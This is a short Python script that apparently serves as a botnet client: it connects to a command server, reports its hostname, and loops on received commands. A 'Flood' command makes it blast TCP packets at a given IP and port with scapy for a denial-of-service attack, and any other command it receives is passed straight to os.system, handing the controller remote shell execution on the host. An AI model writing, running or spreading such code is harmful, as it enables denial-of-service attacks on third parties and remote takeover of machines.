#coding:utf-8
import socket
import os
import scapy.all as scapy

hostname = socket.gethostname()
host, port = ("localhost", 4445)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect((host, port))
print("Connection to the server done.")

hostname = hostname.encode()
s.send(hostname)


while True:
    z_command = s.recv(1024).decode("utf8")

    if(z_command.startswith("Flood")):
        target = z_command.split('Flood ')

        target = target[1]

        target_ip_port = target.split(":")

        target_ip = target_ip_port[0]
        target_ip = str(target_ip)

        target_port = target_ip_port[1]
        target_port = int(target_port)

        pkts = target_ip_port[2]
        pkts = int(pkts)

        source_ip = "1.1.1.1"
        i = 1

        while i != pkts:
            a = str(scapy.random.randint(1,254))
            b = str(scapy.random.randint(1,254))
            c = str(scapy.random.randint(1,254))
            d = str(scapy.random.randint(1,254))
            dot = "."
            
            Source_ip = a + dot + b + dot + c + dot + d
            IP1 = scapy.IP(src = source_ip, dst = target_ip)
            TCP1 = scapy.TCP(sport = 4444, dport = target_port)
            pkt = IP1 / TCP1
            scapy.sendp(pkt,inter = .001, iface="en1")
            print ("packet sent ", i)
            i = i + 1

    
    if(z_command == "close"):
        quit()

    os.system(z_command)

#if(z_command.lower == ""):
#    break
        





